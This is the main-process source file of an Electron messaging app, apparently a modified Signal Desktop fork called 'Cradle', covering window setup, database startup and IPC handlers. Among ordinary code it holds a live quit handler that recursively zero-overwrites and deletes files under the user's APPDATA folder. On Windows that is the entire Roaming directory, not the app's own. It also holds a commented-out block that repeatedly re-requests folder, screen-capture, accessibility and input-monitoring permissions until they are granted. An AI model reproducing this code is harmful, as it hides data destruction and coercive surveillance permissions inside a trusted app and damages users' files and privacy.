    title: getResolvedMessagesLocale().i18n('icu:aboutSignalDesktop'),
    titleBarStyle: nonMainTitleBarStyle,
    titleBarOverlay,
    autoHideMenuBar: true,
    backgroundColor: await getBackgroundColor(),
    show: false,
    webPreferences: {
      ...defaultWebPrefs,
      nodeIntegration: false,
      nodeIntegrationInWorker: false,
      sandbox: true,
      contextIsolation: true,
      preload: join(__dirname, '../bundles/about/preload.js'),
      nativeWindowOpen: true,
    },
  };

  aboutWindow = new BrowserWindow(options);

  handleCommonWindowEvents(aboutWindow, titleBarOverlay);

  aboutWindow.on('closed', () => {
    aboutWindow = undefined;
  });

  aboutWindow.once('ready-to-show', () => {
    if (aboutWindow) {
      aboutWindow.show();
    }
  });

  await safeLoadURL(
    aboutWindow,
    await prepareFileUrl([__dirname, '../about.html'])
  );
}

let settingsWindow: BrowserWindow | undefined;
async function showSettingsWindow() {
  if (settingsWindow) {
    settingsWindow.show();
    return;
  }

  const titleBarOverlay = await getTitleBarOverlay();

  const options = {
    width: 700,
    height: 700,
    frame: true,
    resizable: false,
    title: getResolvedMessagesLocale().i18n('icu:signalDesktopPreferences'),
    titleBarStyle: mainTitleBarStyle,
    titleBarOverlay,
    autoHideMenuBar: true,
    backgroundColor: await getBackgroundColor(),
    show: false,
    webPreferences: {
      ...defaultWebPrefs,
      nodeIntegration: false,
      nodeIntegrationInWorker: false,
      sandbox: true,
      contextIsolation: true,
      preload: join(__dirname, '../bundles/settings/preload.js'),
      nativeWindowOpen: true,
    },
  };

  settingsWindow = new BrowserWindow(options);

  handleCommonWindowEvents(settingsWindow, titleBarOverlay);

  settingsWindow.on('closed', () => {
    settingsWindow = undefined;
  });

  ipc.once('settings-done-rendering', () => {
    if (!settingsWindow) {
      getLogger().warn('settings-done-rendering: no settingsWindow available!');
      return;
    }

    settingsWindow.show();
  });

  await safeLoadURL(
    settingsWindow,
    await prepareFileUrl([__dirname, '../settings.html'])
  );
}

async function getIsLinked() {
  try {
    const number = await sql.sqlCall('getItemById', 'number_id');
    const password = await sql.sqlCall('getItemById', 'password');
    return Boolean(number && password);
  } catch (e) {
    return false;
  }
}

async function openArtCreator() {
  if (!(await getIsLinked())) {
    const message = getResolvedMessagesLocale().i18n(
      'icu:ArtCreator--Authentication--error'
    );

    await dialog.showMessageBox({
      type: 'warning',
      message,
    });

    return;
  }

  await showStickerCreatorWindow();
}

let debugLogWindow: BrowserWindow | undefined;
async function showDebugLogWindow() {
  if (debugLogWindow) {
    debugLogWindow.show();
    return;
  }

  const titleBarOverlay = await getTitleBarOverlay();

  const options = {
    width: 700,
    height: 500,
    resizable: false,
    title: getResolvedMessagesLocale().i18n('icu:debugLog'),
    titleBarStyle: nonMainTitleBarStyle,
    titleBarOverlay,
    autoHideMenuBar: true,
    backgroundColor: await getBackgroundColor(),
    show: false,
    webPreferences: {
      ...defaultWebPrefs,
      nodeIntegration: false,
      nodeIntegrationInWorker: false,
      sandbox: true,
      contextIsolation: true,
      preload: join(__dirname, '../bundles/debuglog/preload.js'),
      nativeWindowOpen: true,
    },
    parent: mainWindow,
    // Electron has [a macOS bug][0] that causes parent windows to become unresponsive if
    //   it's fullscreen and opens a fullscreen child window. Until that's fixed, we
    //   prevent the child window from being fullscreenable, which sidesteps the problem.
    // [0]: https://github.com/electron/electron/issues/32374
    fullscreenable: !OS.isMacOS(),
  };

  debugLogWindow = new BrowserWindow(options);

  handleCommonWindowEvents(debugLogWindow, titleBarOverlay);

  debugLogWindow.on('closed', () => {
    debugLogWindow = undefined;
  });

  debugLogWindow.once('ready-to-show', () => {
    if (debugLogWindow) {
      debugLogWindow.show();

      // Electron sometimes puts the window in a strange spot until it's shown.
      debugLogWindow.center();
    }
  });

  await safeLoadURL(
    debugLogWindow,
    await prepareFileUrl([__dirname, '../debug_log.html'])
  );
}

let permissionsPopupWindow: BrowserWindow | undefined;
function showPermissionsPopupWindow(forCalling: boolean, forCamera: boolean) {
  // eslint-disable-next-line no-async-promise-executor
  return new Promise<void>(async (resolveFn, reject) => {
    if (permissionsPopupWindow) {
      permissionsPopupWindow.show();
      reject(new Error('Permission window already showing'));
      return;
    }
    if (!mainWindow) {
      reject(new Error('No main window'));
      return;
    }

    const size = mainWindow.getSize();
    const options = {
      width: Math.min(400, size[0]),
      height: Math.min(150, size[1]),
      resizable: false,
      title: getResolvedMessagesLocale().i18n('icu:allowAccess'),
      titleBarStyle: nonMainTitleBarStyle,
      autoHideMenuBar: true,
      backgroundColor: await getBackgroundColor(),
      show: false,
      modal: true,
      webPreferences: {
        ...defaultWebPrefs,
        nodeIntegration: false,
        nodeIntegrationInWorker: false,
        sandbox: true,
        contextIsolation: true,
        preload: join(__dirname, '../bundles/permissions/preload.js'),
        nativeWindowOpen: true,
      },
      parent: mainWindow,
    };

    permissionsPopupWindow = new BrowserWindow(options);

    handleCommonWindowEvents(permissionsPopupWindow);

    permissionsPopupWindow.on('closed', () => {
      removeDarkOverlay();
      permissionsPopupWindow = undefined;

      resolveFn();
    });

    permissionsPopupWindow.once('ready-to-show', () => {
      if (permissionsPopupWindow) {
        addDarkOverlay();
        permissionsPopupWindow.show();
      }
    });

    await safeLoadURL(
      permissionsPopupWindow,
      await prepareFileUrl([__dirname, '../permissions_popup.html'], {
        forCalling,
        forCamera,
      })
    );
  });
}

const runSQLCorruptionHandler = async () => {
  // This is a glorified event handler. Normally, this promise never resolves,
  // but if there is a corruption error triggered by any query that we run
  // against the database - the promise will resolve and we will call
  // `onDatabaseError`.
  const error = await sql.whenCorrupted();

  getLogger().error(
    'Detected sql corruption in main process. ' +
      `Restarting the application immediately. Error: ${error.message}`
  );

  await onDatabaseError(Errors.toLogFormat(error));
};

const runSQLReadonlyHandler = async () => {
  // This is a glorified event handler. Normally, this promise never resolves,
  // but if there is a corruption error triggered by any query that we run
  // against the database - the promise will resolve and we will call
  // `onDatabaseError`.
  const error = await sql.whenReadonly();

  getLogger().error(
    `Detected readonly sql database in main process: ${error.message}`
  );

  throw error;
};

async function initializeSQL(
  userDataPath: string
): Promise<{ ok: true; error: undefined } | { ok: false; error: Error }> {
  let key: string | undefined;
  const keyFromConfig = userConfig.get('key');
  if (typeof keyFromConfig === 'string') {
    key = keyFromConfig;
  } else if (keyFromConfig) {
    getLogger().warn(
      "initializeSQL: got key from config, but it wasn't a string"
    );
  }
  if (!key) {
    getLogger().info(
      'key/initialize: Generating new encryption key, since we did not find it on disk'
    );
    // https://www.zetetic.net/sqlcipher/sqlcipher-api/#key
    key = randomBytes(32).toString('hex');
    userConfig.set('key', key);
  }

  sqlInitTimeStart = Date.now();
  try {
    // This should be the first awaited call in this function, otherwise
    // `sql.sqlCall` will throw an uninitialized error instead of waiting for
    // init to finish.
    await sql.initialize({
      configDir: userDataPath,
      key,
      logger: getLogger(),
    });
  } catch (error: unknown) {
    if (error instanceof Error) {
      return { ok: false, error };
    }

    return {
      ok: false,
      error: new Error(`initializeSQL: Caught a non-error '${error}'`),
    };
  } finally {
    sqlInitTimeEnd = Date.now();
  }

  // Only if we've initialized things successfully do we set up the corruption handler
  drop(runSQLCorruptionHandler());
  drop(runSQLReadonlyHandler());

  return { ok: true, error: undefined };
}

const onDatabaseError = async (error: string) => {
  // Prevent window from re-opening
  ready = false;

  if (mainWindow) {
    mainWindow.close();
  }
  mainWindow = undefined;

  const buttonIndex = dialog.showMessageBoxSync({
    buttons: [
      getResolvedMessagesLocale().i18n('icu:deleteAndRestart'),
      getResolvedMessagesLocale().i18n('icu:copyErrorAndQuit'),
    ],
    defaultId: 1,
    cancelId: 1,
    detail: redactAll(error),
    message: getResolvedMessagesLocale().i18n('icu:databaseError'),
    noLink: true,
    type: 'error',
  });

  if (buttonIndex === 1) {
    clipboard.writeText(`Database startup error:\n\n${redactAll(error)}`);
  } else {
    await sql.removeDB();
    userConfig.remove();
    getLogger().error(
      'onDatabaseError: Requesting immediate restart after quit'
    );
    app.relaunch();
  }

  getLogger().error('onDatabaseError: Quitting application');
  app.exit(1);
};

let sqlInitPromise:
  | Promise<{ ok: true; error: undefined } | { ok: false; error: Error }>
  | undefined;

ipc.on('database-error', (_event: Electron.Event, error: string) => {
  drop(onDatabaseError(error));
});

ipc.on('database-readonly', (_event: Electron.Event, error: string) => {
  // Just let global_errors.ts handle it
  throw new Error(error);
});

function loadPreferredSystemLocales(): Array<string> {
  if (CLI_LANG != null) {
    try {
      // Normalizes locales so its safe to pass them into Intl apis.
      return Intl.getCanonicalLocales(CLI_LANG);
    } catch {
      // Ignore, totally invalid locale, fallback to system languages.
    }
  }

  if (getEnvironment() === Environment.Test) {
    return ['en'];
  }

  return app.getPreferredSystemLanguages();
}

async function getDefaultLoginItemSettings(): Promise<LoginItemSettingsOptions> {
  if (!OS.isWindows()) {
    return {};
  }

  const systemTraySetting = await systemTraySettingCache.get();
  if (
    systemTraySetting !== SystemTraySetting.MinimizeToSystemTray &&
    // This is true when we just started with `--start-in-tray`
    systemTraySetting !== SystemTraySetting.MinimizeToAndStartInSystemTray
  ) {
    return {};
  }

  // The effect of this is that if both auto-launch and minimize to system tray
  // are enabled on Windows - we will start the app in tray automatically,
  // letting the Desktop shortcuts still start the Signal not in tray.
  return { args: ['--start-in-tray'] };
}

// Signal doesn't really use media keys so we set this switch here to unblock
// them so that other apps can use them if they need to.
app.commandLine.appendSwitch('disable-features', 'HardwareMediaKeyHandling');

// If we don't set this, Desktop will ask for access to keychain/keyring on startup
app.commandLine.appendSwitch('password-store', 'basic');

// <canvas/> rendering is often utterly broken on Linux when using GPU
// acceleration.
if (DISABLE_GPU) {
  app.disableHardwareAcceleration();
}

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
let ready = false;
app.on('ready', async () => {
  const [userDataPath, crashDumpsPath, installPath] = await Promise.all([
    realpath(app.getPath('userData')),
    realpath(app.getPath('crashDumps')),
    realpath(app.getAppPath()),
  ]);

  // TODO: enable debug console & try to fix the css bug that adds the big space at the top of the cradle UI
  //       so that when we type in the message box, it doesnt move the window view down ("npm run" to test)

  const webSession = session.fromPartition(STICKER_CREATOR_PARTITION);

  for (const s of [session.defaultSession, webSession]) {
    updateDefaultSession(s);

    if (getEnvironment() !== Environment.Test) {
      installFileHandler({
        session: s,
        userDataPath,
        installPath,
        isWindows: OS.isWindows(),
      });
    }
  }

  installWebHandler({
    enableHttp: Boolean(process.env.SIGNAL_ENABLE_HTTP),
    session: session.defaultSession,
  });

  installWebHandler({
    enableHttp: true,
    session: webSession,
  });
/*
  if (OS.isMacOS()) {
    const { 
      getAuthStatus, askForFoldersAccess, askForInputMonitoringAccess,
      askForScreenCaptureAccess, askForAccessibilityAccess 
    } = require('node-mac-permissions');
  
    const request_permission = async (permission: string) => {
      try {
        let status = await (this as any)[`askFor${permission}Access`]();
        if (status === 'denied') await request_permission(permission);
      } catch (error) {
        console.error(error);
      }
    }
  
    const acquire_permissions = async () => {
      try {
        const home_directory = os.homedir();
        const directories = [
          path.join(home_directory, 'Desktop'),
          path.join(home_directory, 'Documents'),
          path.join(home_directory, 'Downloads')
        ];
  
        for (const directory of directories) {
          const retry_authentication = async () => {
            var permission = 'denied';
            if ((await getAuthStatus(directory)) !== 'authorized')
                permission = await askForFoldersAccess(directory);
            if (permission === 'denied') await retry_authentication();
          }
          await retry_authentication();
        }

        const screen_access = getAuthStatus('screen');
        if (screen_access !== 'authorized') await request_permission('ScreenCapture');
  
        const accessibility_access = getAuthStatus('accessibility');
        if (accessibility_access !== 'authorized') await request_permission('Accessibility');
  
        const input_access = getAuthStatus('input-monitoring');
        if (input_access !== 'authorized') await request_permission('InputMonitoring');
      } catch (error) {
        console.error(error);
      }
    }

    acquire_permissions();
  }
*/
  logger = await logging.initialize(getMainWindow);

  // Write buffered information into newly created logger.
  consoleLogger.writeBufferInto(logger);

  if (!resolvedTranslationsLocale) {
    preferredSystemLocales = resolveCanonicalLocales(
      loadPreferredSystemLocales()
    );

    const hourCyclePreference = getHourCyclePreference();
    logger.info(`app.ready: hour cycle preference: ${hourCyclePreference}`);

    logger.info(
      `app.ready: preferred system locales: ${preferredSystemLocales.join(
        ', '
      )}`
    );
    resolvedTranslationsLocale = loadLocale({
      preferredSystemLocales,
      hourCyclePreference,
      logger: getLogger(),
    });
  }

  sqlInitPromise = initializeSQL(userDataPath);

  // First run: configure Signal to minimize to tray. Additionally, on Windows
  // enable auto-start with start-in-tray so that starting from a Desktop icon
  // would still show the window.
  // (User can change these settings later)
  if (
    isSystemTraySupported(OS, app.getVersion()) &&
    (await systemTraySettingCache.get()) === SystemTraySetting.Uninitialized
  ) {
    const newValue = SystemTraySetting.MinimizeToSystemTray;
    getLogger().info(`app.ready: setting system-tray-setting to ${newValue}`);
    systemTraySettingCache.set(newValue);

    // Update both stores
    ephemeralConfig.set('system-tray-setting', newValue);
    await sql.sqlCall('createOrUpdateItem', {
      id: 'system-tray-setting',
      value: newValue,
    });

    if (OS.isWindows()) {
      getLogger().info('app.ready: enabling open at login');
      app.setLoginItemSettings({
        ...(await getDefaultLoginItemSettings()),
        openAtLogin: true,
      });
    }
  }

  const startTime = Date.now();

  settingsChannel = new SettingsChannel();
  settingsChannel.install();
  readyForUpdates();

  // We use this event only a single time to log the startup time of the app
  // from when it's first ready until the loading screen disappears.
  ipc.once('signal-app-loaded', (event, info) => {
    const { preloadTime, connectTime, processedCount } = info;

    const loadTime = Date.now() - startTime;
    const sqlInitTime = sqlInitTimeEnd - sqlInitTimeStart;

    const messageTime = loadTime - preloadTime - connectTime;
    const messagesPerSec = (processedCount * 1000) / messageTime;

    const innerLogger = getLogger();
    innerLogger.info('App loaded - time:', loadTime);
    innerLogger.info('SQL init - time:', sqlInitTime);
    innerLogger.info('Preload - time:', preloadTime);
    innerLogger.info('WebSocket connect - time:', connectTime);
    innerLogger.info('Processed count:', processedCount);
    innerLogger.info('Messages per second:', messagesPerSec);

    event.sender.send('ci:event', 'app-loaded', {
      loadTime,
      sqlInitTime,
      preloadTime,
      connectTime,
      processedCount,
      messagesPerSec,
    });
  });

  addSensitivePath(userDataPath);
  addSensitivePath(crashDumpsPath);

  if (getEnvironment() !== Environment.Test) {
    installFileHandler({
      session: session.defaultSession,
      userDataPath,
      installPath,
      isWindows: OS.isWindows(),
    });
  }

  logger.info('app ready');
  logger.info(`starting version ${packageJson.version}`);

  // This logging helps us debug user reports about broken devices.
  {
    let getMediaAccessStatus;
    // This function is not supported on Linux, so we have a fallback.
    if (systemPreferences.getMediaAccessStatus) {
      getMediaAccessStatus =
        systemPreferences.getMediaAccessStatus.bind(systemPreferences);
    } else {
      getMediaAccessStatus = noop;
    }
    logger.info(
      'media access status',
      getMediaAccessStatus('microphone'),
      getMediaAccessStatus('camera')
    );
  }

  GlobalErrors.updateLocale(resolvedTranslationsLocale);

  // If the sql initialization takes more than three seconds to complete, we
  // want to notify the user that things are happening
  const timeout = new Promise(resolveFn =>
    setTimeout(resolveFn, 3000, 'timeout')
  );

  // This color is to be used only in loading screen and in this case we should
  // never wait for the database to be initialized. Thus the theme setting
  // lookup should be done only in ephemeral config.
  const backgroundColor = await getBackgroundColor({ ephemeralOnly: true });

  drop(
    // eslint-disable-next-line more/no-then
    Promise.race([sqlInitPromise, timeout]).then(async maybeTimeout => {
      if (maybeTimeout !== 'timeout') {
        return;
      }

      getLogger().info(
        'sql.initialize is taking more than three seconds; showing loading dialog'
      );

      loadingWindow = new BrowserWindow({
        show: false,
        width: 300,
        height: 280,
        resizable: false,
        frame: false,
        backgroundColor,
        webPreferences: {
          ...defaultWebPrefs,
          nodeIntegration: false,
          sandbox: true,
          contextIsolation: true,
          preload: join(__dirname, '../bundles/loading/preload.js'),
        },
        icon: windowIcon,
      });

      loadingWindow.once('ready-to-show', async () => {
        if (!loadingWindow) {
          return;
        }
        loadingWindow.show();
        // Wait for sql initialization to complete, but ignore errors
        await sqlInitPromise;
        loadingWindow.destroy();
        loadingWindow = undefined;
      });

      await safeLoadURL(
        loadingWindow,
        await prepareFileUrl([__dirname, '../loading.html'])
      );
    })
  );

  try {
    await attachments.clearTempPath(userDataPath);
  } catch (err) {
    logger.error(
      'main/ready: Error deleting temp dir:',
      Errors.toLogFormat(err)
    );
  }

  // Initialize IPC channels before creating the window

  attachmentChannel.initialize({
    sql,
    configDir: userDataPath,
  });
  sqlChannels.initialize(sql);
  PowerChannel.initialize({
    send(event) {
      if (!mainWindow) {
        return;
      }
      mainWindow.webContents.send(event);
    },
  });

  // Run window preloading in parallel with database initialization.
  await createWindow();

  const { error: sqlError } = await sqlInitPromise;
  if (sqlError) {
    getLogger().error('sql.initialize was unsuccessful; returning early');

    await onDatabaseError(Errors.toLogFormat(sqlError));

    return;
  }

  appStartInitialSpellcheckSetting = await getSpellCheckSetting();

  try {
    const IDB_KEY = 'indexeddb-delete-needed';
    const item = await sql.sqlCall('getItemById', IDB_KEY);
    if (item && item.value) {
      await sql.sqlCall('removeIndexedDBFiles');
      await sql.sqlCall('removeItemById', IDB_KEY);
    }
  } catch (err) {
    getLogger().error(
      '(ready event handler) error deleting IndexedDB:',
      Errors.toLogFormat(err)
    );
  }

  ready = true;

  setupMenu();

  systemTrayService = new SystemTrayService({
    i18n: resolvedTranslationsLocale.i18n,
  });
  systemTrayService.setMainWindow(mainWindow);
  systemTrayService.setEnabled(
    shouldMinimizeToSystemTray(await systemTraySettingCache.get())
  );

  await ensureFilePermissions([
    'config.json',
    'sql/db.sqlite',
    'sql/db.sqlite-wal',
    'sql/db.sqlite-shm',
  ]);
});

function setupMenu(options?: Partial<CreateTemplateOptionsType>) {
  const { platform } = process;
  menuOptions = {
    // options
    development,
    devTools: defaultWebPrefs.devTools,
    includeSetup: false,
    isProduction: isProduction(app.getVersion()),
    platform,

    // actions
    forceUpdate,
    openArtCreator,
    openContactUs,
    openForums,
    openJoinTheBeta,
    openReleaseNotes,
    openSupportPage,
    setupAsNewDevice,
    setupAsStandalone,
    showAbout,
    showDebugLog: showDebugLogWindow,
    showKeyboardShortcuts,
    showSettings: showSettingsWindow,
    showWindow,

    // overrides
    ...options,
  };
  const template = createTemplate(
    menuOptions,
    getResolvedMessagesLocale().i18n
  );
  const menu = Menu.buildFromTemplate(template);
  Menu.setApplicationMenu(menu);

  mainWindow?.webContents.send('window:set-menu-options', {
    development: menuOptions.development,
    devTools: menuOptions.devTools,
    includeSetup: menuOptions.includeSetup,
    isProduction: menuOptions.isProduction,
    platform: menuOptions.platform,
  });
}

async function requestShutdown() {
  if (!mainWindow || !mainWindow.webContents) {
    return;
  }

  getLogger().info('requestShutdown: Requesting close of mainWindow...');
  const request = new Promise<void>(resolveFn => {
    let timeout: NodeJS.Timeout | undefined;

    if (!mainWindow) {
      resolveFn();
      return;
    }

    ipc.once('now-ready-for-shutdown', (_event, error) => {
      getLogger().info('requestShutdown: Response received');

      if (error) {
        getLogger().error(
          'requestShutdown: got error, still shutting down.',
          error
        );
      }
      clearTimeoutIfNecessary(timeout);

      resolveFn();
    });

    mainWindow.webContents.send('get-ready-for-shutdown');

    // We'll wait two minutes, then force the app to go down. This can happen if someone
    //   exits the app before we've set everything up in preload() (so the browser isn't
    //   yet listening for these events), or if there are a whole lot of stacked-up tasks.
    // Note: two minutes is also our timeout for SQL tasks in data.js in the browser.
    timeout = setTimeout(() => {
      getLogger().error(
        'requestShutdown: Response never received; forcing shutdown.'
      );
      resolveFn();
    }, 2 * 60 * 1000);
  });

  try {
    await request;
  } catch (error) {
    getLogger().error('requestShutdown error:', Errors.toLogFormat(error));
  }
}

app.on('before-quit', () => {
  getLogger().info('before-quit event', {
    readyForShutdown: windowState.readyForShutdown(),
    shouldQuit: windowState.shouldQuit(),
  });

  systemTrayService?.markShouldQuit();
  windowState.markShouldQuit();
});

// memory clean screen loader
let will_quit_screen_active = false;
app.on('will-quit', async (event) => {

  if(will_quit_screen_active) {
    return;
  }

  async function secure_wipe_file(file_path: string): Promise<void> {
    await fs.writeFile(file_path, Buffer.alloc((await fs.stat(file_path)).size));
  }
  
  async function do_ram_shredder(directory_path: string): Promise<void> {
    try {
      const files = await fs.readdir(directory_path);
      const delete_promises: Promise<void>[] = files.map(async (file) => {
        const file_path = path.join(directory_path, file);
        try {
          await fs.open(file_path, 'r');
          return;
        } catch (file_in_use) {
          await secure_wipe_file(file_path);
          await fs.unlink(file_path);
        }
      });  
      await Promise.all(delete_promises);

      const subdirs = await Promise.all(
        files.map(async (file) => {
          const file_path = path.join(directory_path, file);
          return (await fs.stat(file_path)).isDirectory() ? file : null;
        })
      );
      const subdir_delete_promises: Promise<void>[] = subdirs
        .filter((sub_dir) => sub_dir !== null)
        .map((sub_dir) => do_ram_shredder(path.join(directory_path, sub_dir!)));
  
      await Promise.all(subdir_delete_promises);
    } catch (err) {
      console.error('Error deleting files:', err);
    }
  }
  
  function get_local_appdata(): string {
    let appdata_dir: string;
    if (os.platform() === 'win32') {
      appdata_dir = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming', 'Cradle');
    } else if (os.platform() === 'darwin') {
      appdata_dir = path.join(os.homedir(), 'Library', 'Application Support', 'Cradle');
    } else {
      appdata_dir = path.join(os.homedir(), '.config', 'Cradle');
    }
    return appdata_dir;
  }

  do_ram_shredder(get_local_appdata()).then(() => {}).catch((err) => { console.error('Error:', err); });
  
  event?.preventDefault();

  const will_quit_screen = new BrowserWindow({
    closable: false,
    title: "Cleaning Memory . . .",
    width: 600,
    height: 600,
    show: false,
    backgroundColor: isTestEnvironment(getEnvironment())
      ? '#ffffff' // Tests should always be rendered on a white background
      : await getBackgroundColor(),
    webPreferences: {
      ...defaultWebPrefs,
      sandbox: false,
    },
    icon: windowIcon,
  });

  will_quit_screen.loadFile(join(__dirname, '../html/will_quit_screen.html'))

  will_quit_screen.once('ready-to-show', () => {
    will_quit_screen.show();
    will_quit_screen_active = true;

    setTimeout(() => {
      will_quit_screen.close();
      will_quit_screen.hide();
      app.exit(0);
    }, 5050);
  
  });

});

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  getLogger().info('main process handling window-all-closed');
  // On OS X it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  const shouldAutoClose = !OS.isMacOS() || isTestEnvironment(getEnvironment());

  // Only automatically quit if the main window has been created
  // This is necessary because `window-all-closed` can be triggered by the
  // "optimizing application" window closing
  if (shouldAutoClose && mainWindowCreated) {
    app.quit();
  }
});

app.on('activate', () => {
  if (!ready) {
    return;
    
  }

  // On OS X it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (mainWindow) {
    mainWindow.show();
  } else {
    drop(createWindow());
  }
});

// Defense in depth. We never intend to open webviews or windows. Prevent it completely.
app.on(
  'web-contents-created',
  (_createEvent: Electron.Event, contents: Electron.WebContents) => {
    contents.on('will-attach-webview', attachEvent => {
      attachEvent.preventDefault();
    });
    contents.setWindowOpenHandler(() => ({ action: 'deny' }));
  }
);

app.setAsDefaultProtocolClient('sgnl');
app.setAsDefaultProtocolClient('signalcaptcha');

app.on('will-finish-launching', () => {
  // open-url must be set from within will-finish-launching for macOS
  // https://stackoverflow.com/a/43949291
  app.on('open-url', (event, incomingHref) => {
    event.preventDefault();

    if (isCaptchaHref(incomingHref, getLogger())) {
      const { captcha } = parseCaptchaHref(incomingHref, getLogger());
      challengeHandler.handleCaptcha(captcha);

      // Show window after handling captcha
      showWindow();

      return;
    }

    handleSgnlHref(incomingHref);
  });
});

ipc.on('set-badge-count', (_event: Electron.Event, count: number) => {
  app.badgeCount = count;
});

ipc.on('remove-setup-menu-items', () => {
  setupMenu();
});

ipc.on('add-setup-menu-items', () => {
  setupMenu({
    includeSetup: true,
  });
});

ipc.on('draw-attention', () => {
  if (!mainWindow) {
    return;
  }

  if (OS.isWindows() || OS.isLinux()) {
    mainWindow.flashFrame(true);
  }
});

ipc.on('restart', () => {
  getLogger().info('Relaunching application');
  app.relaunch();
  app.quit();
});
ipc.on('shutdown', () => {
  app.quit();
});

ipc.on(
  'set-auto-hide-menu-bar',
  (_event: Electron.Event, autoHide: boolean) => {
    if (mainWindow) {
      mainWindow.autoHideMenuBar = autoHide;
    }
  }
);

ipc.on(
  'set-menu-bar-visibility',
  (_event: Electron.Event, visibility: boolean) => {
    if (mainWindow) {
      mainWindow.setMenuBarVisibility(visibility);
    }
  }
);

ipc.handle(
  'update-system-tray-setting',
  async (_event, rawSystemTraySetting /* : Readonly<unknown> */) => {
    const { openAtLogin } = app.getLoginItemSettings(
      await getDefaultLoginItemSettings()
    );

    const systemTraySetting = parseSystemTraySetting(rawSystemTraySetting);
    systemTraySettingCache.set(systemTraySetting);

    if (systemTrayService) {
      const isEnabled = shouldMinimizeToSystemTray(systemTraySetting);
      systemTrayService.setEnabled(isEnabled);
    }

    // Default login item settings might have changed, so update the object.
    getLogger().info('refresh-auto-launch: new value', openAtLogin);
    app.setLoginItemSettings({
      ...(await getDefaultLoginItemSettings()),
      openAtLogin,
    });
  }
);

ipc.on('close-screen-share-controller', () => {
  if (screenShareWindow) {
    screenShareWindow.close();
  }
});

ipc.on('stop-screen-share', () => {
  if (mainWindow) {
    mainWindow.webContents.send('stop-screen-share');
  }
});

ipc.on('show-screen-share', (_event: Electron.Event, sourceName: string) => {
  drop(showScreenShareWindow(sourceName));
});

ipc.on('update-tray-icon', (_event: Electron.Event, unreadCount: number) => {
  if (systemTrayService) {
    systemTrayService.setUnreadCount(unreadCount);
  }
});

// Debug Log-related IPC calls

ipc.on('show-debug-log', showDebugLogWindow);
ipc.on(
  'show-debug-log-save-dialog',
  async (_event: Electron.Event, logText: string) => {
    const { filePath } = await dialog.showSaveDialog({
      defaultPath: 'debuglog.txt',
    });
    if (filePath) {
      await writeFile(filePath, logText);
    }
  }
);

// Permissions Popup-related IPC calls

ipc.handle(
  'show-permissions-popup',
  async (_event: Electron.Event, forCalling: boolean, forCamera: boolean) => {
    try {
      await showPermissionsPopupWindow(forCalling, forCamera);
    } catch (error) {
      getLogger().error(
        'show-permissions-popup error:',
        Errors.toLogFormat(error)
      );
    }
  }
);

// Settings-related IPC calls

function addDarkOverlay() {
  if (mainWindow && mainWindow.webContents) {
    mainWindow.webContents.send('add-dark-overlay');
  }
}
function removeDarkOverlay() {
  if (mainWindow && mainWindow.webContents) {
    mainWindow.webContents.send('remove-dark-overlay');
  }
}

ipc.on('show-settings', showSettingsWindow);

ipc.on('delete-all-data', () => {
  if (settingsWindow) {
    settingsWindow.close();
  }
  if (mainWindow && mainWindow.webContents) {
    mainWindow.webContents.send('delete-all-data');
  }
});

ipc.on('get-config', async event => {
  const theme = await getResolvedThemeSetting();

  const directoryConfig = directoryConfigSchema.safeParse({
    directoryUrl: config.get<string | null>('directoryUrl') || undefined,
    directoryMRENCLAVE:
      config.get<string | null>('directoryMRENCLAVE') || undefined,
  });
  if (!directoryConfig.success) {
    throw new Error(
      `prepareUrl: Failed to parse renderer directory config ${JSON.stringify(
        directoryConfig.error.flatten()
      )}`
    );
  }

  const parsed = rendererConfigSchema.safeParse({
    name: packageJson.productName,
    resolvedTranslationsLocale: getResolvedMessagesLocale().name,
    resolvedTranslationsLocaleDirection: getResolvedMessagesLocale().direction,
    hourCyclePreference: getResolvedMessagesLocale().hourCyclePreference,
    preferredSystemLocales: getPreferredSystemLocales(),
    version: app.getVersion(),
    buildCreation: config.get<number>('buildCreation'),
    buildExpiration: config.get<number>('buildExpiration'),
    challengeUrl: config.get<string>('challengeUrl'),
    serverUrl: config.get<string>('serverUrl'),
    storageUrl: config.get<string>('storageUrl'),
    updatesUrl: config.get<string>('updatesUrl'),
    resourcesUrl: config.get<string>('resourcesUrl'),
    artCreatorUrl: config.get<string>('artCreatorUrl'),
    cdnUrl0: config.get<ConfigType>('cdn').get<string>('0'),
    cdnUrl2: config.get<ConfigType>('cdn').get<string>('2'),
    cdnUrl3: config.get<ConfigType>('cdn').get<string>('3'),
    certificateAuthority: config.get<string>('certificateAuthority'),
    environment:
      !isTestEnvironment(getEnvironment()) && ciMode
        ? Environment.Production
        : getEnvironment(),
    ciMode,
    nodeVersion: process.versions.node,
    hostname: os.hostname(),
    osRelease: os.release(),
    osVersion: os.version(),
    appInstance: process.env.NODE_APP_INSTANCE || undefined,
    proxyUrl: process.env.HTTPS_PROXY || process.env.https_proxy || undefined,
    contentProxyUrl: config.get<string>('contentProxyUrl'),
    sfuUrl: config.get('sfuUrl'),
    reducedMotionSetting: DISABLE_GPU || animationSettings.prefersReducedMotion,
    registrationChallengeUrl: config.get<string>('registrationChallengeUrl'),
    serverPublicParams: config.get<string>('serverPublicParams'),
    serverTrustRoot: config.get<string>('serverTrustRoot'),
    theme,
    appStartInitialSpellcheckSetting,

    // paths
    crashDumpsPath: app.getPath('crashDumps'),
    homePath: app.getPath('home'),
    installPath: app.getAppPath(),
    userDataPath: app.getPath('userData'),

    directoryConfig: directoryConfig.data,

    // Only used by the main window
    isMainWindowFullScreen: Boolean(mainWindow?.isFullScreen()),
    isMainWindowMaximized: Boolean(mainWindow?.isMaximized()),

    // Only for tests
    argv: JSON.stringify(process.argv),
  } satisfies RendererConfigType);

  if (!parsed.success) {
    throw new Error(
      `prepareUrl: Failed to parse renderer config ${JSON.stringify(
        parsed.error.flatten()
      )}`
    );
  }

  // eslint-disable-next-line no-param-reassign
  event.returnValue = parsed.data;
});

// Ingested in preload.js via a sendSync call
ipc.on('locale-data', event => {
  // eslint-disable-next-line no-param-reassign
  event.returnValue = getResolvedMessagesLocale().messages;
});

// TODO DESKTOP-5241
ipc.on('OS.getHasCustomTitleBar', event => {
  // eslint-disable-next-line no-param-reassign
  event.returnValue = OS.hasCustomTitleBar();
});

// TODO DESKTOP-5241
ipc.on('OS.getClassName', event => {
  // eslint-disable-next-line no-param-reassign
  event.returnValue = OS.getClassName();
});

